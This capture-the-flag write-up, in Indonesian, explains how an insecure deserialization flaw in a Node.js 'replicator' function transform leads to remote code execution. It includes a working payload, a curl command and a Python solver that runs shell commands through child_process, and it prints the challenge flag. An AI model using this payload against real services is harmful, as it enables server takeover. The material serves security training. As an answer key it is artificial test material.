# Writeup — Legacy Sync

**Category :** Web  
**Difficulty:** Medium  
**Vulnerability:** Insecure Deserialization (`replicator` + custom `[[Function]]` transform) → Remote Code Execution (RCE)  

---

## 📌 Deskripsi Tantangan

Peserta diberikan berkas `chall.zip` yang berisi source code microservice Node.js bernama **Draft Sync API**. Servis ini berfungsi untuk memproses dan menyinkronkan draft dokumen.

- **Tujuan:** Menemukan dan membaca berkas flag yang berada pada path acak di server (`/flag_<random_hex>.txt`).
- **Petunjuk:** Tidak ada hint khusus; peserta harus melakukan analisis source code (whitebox) untuk menemukan attack vector.

---

## 🔍 Alur Penyelesaian (Step-by-Step)

```
[Step 1: Identifikasi Endpoint & Dependency]
                   │
                   ▼
[Step 2: Analisis Logika Undocumented Endpoint]
                   │
                   ▼
[Step 3: Analisis Mekanisme Deserialisasi (Serializer)]
                   │
                   ▼
[Step 4: Penyusunan Payload RCE & Bypass Quirk]
                   │
                   ▼
[Step 5: Eksploitasi & Penarikan Flag]
```

---

### Step 1 — Identifikasi Dependency & Struktur Aplikasi

Pertama, periksa struktur project dan file `package.json` untuk melihat dependency yang digunakan oleh aplikasi:

```json
{
  "dependencies": {
    "express": "4.18.2",
    "replicator": "1.0.5"
  }
}
```

> **Catatan Penting:** Library `replicator` adalah library serialisasi/deserialisasi objek JavaScript yang tidak umum. Hal ini menjadi petunjuk awal bahwa proses deserialisasi perlu dianalisis lebih lanjut.

Struktur berkas utama:
```
challenge/
├── src/
│   ├── app.js
│   ├── routes/
│   │   ├── index.js        ← Endpoint publik & API documentation
│   │   └── draft.js        ← Logika pemrosesan draft
│   └── utils/
│       └── serializer.js   ← Utility serialisasi/deserialisasi
└── package.json
```

---

### Step 2 — Analisis Router & Penemuan Hidden Endpoint

Memeriksa berkas `src/routes/index.js` dan `src/routes/draft.js`:

Pada `src/routes/index.js`, hanya endpoint standar yang didokumentasikan di `/api/docs`. Namun, jika kita membaca `src/routes/draft.js`, terdapat endpoint yang **tidak terdokumentasi (undocumented)**:

```javascript
// POST /api/draft/preview  ← TIDAK ADA di /api/docs
router.post('/preview', (req, res) => {
  const { data } = req.body;

  let draft = serializer.decode(data);        // 1. Decode input dari user

  // ... pemrosesan draft ...

  if (draft.formatter && typeof draft.formatter === 'function') {
    preview = draft.formatter(preview);       // 2. Eksekusi fungsi jika ada!
  }

  return res.json({ success: true, preview });
});
```

**Temuan Utama dari Endpoint Ini:**
1. Input `req.body.data` langsung dimasukkan ke `serializer.decode()`.
2. Setelah di-decode, jika objek `draft` memiliki property `formatter` bertipe `function`, maka fungsi `draft.formatter()` akan langsung **dieksekusi**.

---

### Step 3 — Analisis Deserializer (`utils/serializer.js`)

Selanjutnya, kita periksa bagaimana `serializer.decode()` bekerja di `src/utils/serializer.js`:

```javascript
const Replicator = require('replicator');
const r = new Replicator();

r.addTransforms([{
  type: '[[Function]]',

  shouldTransform: function(type) {
    return type === 'function';
  },

  toSerializable: function(fn) {
    var src   = fn.toString();
    var match = src.match(/^function[^(]*\(([^)]*)\)\s*\{([\s\S]*)\}$/);
    return {
      args: match ? match[1].split(',').map(s => s.trim()).filter(Boolean) : [],
      body: match ? match[2] : src,
    };
  },

  fromSerializable: function(val) {
    return Function.apply(null, val.args.concat(val.body));  // ← Kerentanan Utama!
  },
}]);
```

**Analisis Kerentanan:**
- Developer menambahkan custom transform `[[Function]]` pada `replicator`.
- Fungsi `fromSerializable` menggunakan `Function.apply(null, val.args.concat(val.body))`, yang ekuivalen dengan eksekusi `new Function(args..., body)`.
- **Dampak:** Siapapun yang dapat memicu `serializer.decode()` dengan format JSON `[[Function]]` dapat mengonstruksi dan mengeksekusi **arbitrary JavaScript function** di server.

---

### Step 4 — Penyusunan Payload (Payload Crafting & Quirks)

#### A. Format Objek Replicator `[[Function]]`
Berdasarkan logika transform `[[Function]]`, objek fungsi di-encode oleh `replicator` dengan struktur:

```json
{
  "@t": "[[Function]]",
  "data": {
    "args": ["s"],
    "body": "<kode_javascript>"
  }
}
```

#### B. Mengatasi Scoping Quirk (`new Function()`)
Dalam Node.js, kode yang dijalankan di dalam `new Function()` dievaluasi di **Global Scope**. 
Oleh karena itu:
- Fungsi `require()` biasa **tidak tersedia** (akan menghasilkan error `require is not defined`).
- **Solusi:** Gunakan `process.mainModule.require()` karena objek `process` tersedia di global scope Node.js.

#### C. Menangani Nama Flag Dinamis
Karena file flag berada di `/flag_<random_hex>.txt`, payload harus:
1. Membaca direktori root `/` menggunakan `fs.readdirSync('/')`.
2. Mencari nama file yang sesuai regex `/^flag_/`.
3. Membaca isi file menggunakan `child_process.execSync('cat /' + flagFile)`.

#### D. Payload Akhir (JSON)

```json
[
  {
    "title": "test",
    "content": "test",
    "formatter": {
      "@t": "[[Function]]",
      "data": {
        "args": ["s"],
        "body": "var cp=process.mainModule.require('child_process');var fs=process.mainModule.require('fs');var f=fs.readdirSync('/').find(function(x){return /^flag_/.test(x);});return f?cp.execSync('cat /'+f).toString().trim():'not found';"
      }
    }
  }
]
```

---

### Step 5 — Eksploitasi & Eksekusi

Kirim request HTTP POST ke endpoint `/api/draft/preview` dengan membawa payload yang sudah disiapkan:

#### Menggunakan `curl`:

```bash
curl -s -X POST http://<target_host>:<port>/api/draft/preview \
  -H 'Content-Type: application/json' \
  -d '{
    "data": "[{\"title\":\"test\",\"content\":\"test\",\"formatter\":{\"@t\":\"[[Function]]\",\"data\":{\"args\":[\"s\"],\"body\":\"var cp=process.mainModule.require(\x27child_process\x27);var fs=process.mainModule.require(\x27fs\x27);var f=fs.readdirSync(\x27/\x27).find(function(x){return /^flag_/.test(x);});return f?cp.execSync(\x27cat /\x27+f).toString().trim():\x27not found\x27;\"}}}]"
  }'
```

#### Menggunakan Python Solver:

```python
import requests
import json

TARGET = "http://localhost:3000"

js_body = (
    "var cp=process.mainModule.require('child_process');"
    "var fs=process.mainModule.require('fs');"
    "var f=fs.readdirSync('/').find(function(x){return /^flag_/.test(x);});"
    "return f?cp.execSync('cat /'+f).toString().trim():'not found';"
)

payload = [{
    "title": "test",
    "content": "test",
    "formatter": {
        "@t": "[[Function]]",
        "data": {
            "args": ["s"],
            "body": js_body
        }
    }
}]

res = requests.post(f"{TARGET}/api/draft/preview", json={"data": json.dumps(payload)})
print(res.json())
```

#### Server Response:

```json
{
  "success": true,
  "preview": "HOLOGY9{g3l0k_4d4_h4ck3r_nj1r_w3b_3z_k3kny4_9a8f2c}"
}
```

**Flag:** `HOLOGY9{g3l0k_4d4_h4ck3r_nj1r_w3b_3z_k3kny4_9a8f2c}`

---

## 📊 Difficulty Mapping

Sesuai dengan kriteria pada `rules.md`:

| Parameter | Level | Penjelasan |
|---|---|---|
| **Multifaceted Skills** | **Medium** | Fokus pada Web Exploitation, dikombinasikan dengan Source Code Review dan Analisis Mechanism Serialization. |
| **Complex Payload** | **Medium** | Memerlukan analisis format serialisasi `@t` serta pemahaman quirk global scope `new Function()` (`process.mainModule.require`). |
| **Multiple Steps** | **Medium** | Alur eksplorasi: Identifikasi file zip → Temukan hidden endpoint `/preview` → Analisis `serializer.js` → Craft payload RCE → Eksekusi & baca flag. |
| **Dynamic Elements** | **Medium** | Path file flag bersifat dinamis di server (`/flag_<random_hex>.txt`), mengharuskan enumeration direktori `/`. |
| **Hidden Attack Vector** | **Medium** | Endpoint `/api/draft/preview` tidak tercantum di dokumentasi API (`/api/docs`), dan mekanisme `[[Function]]` perlu ditemukan via kode. |
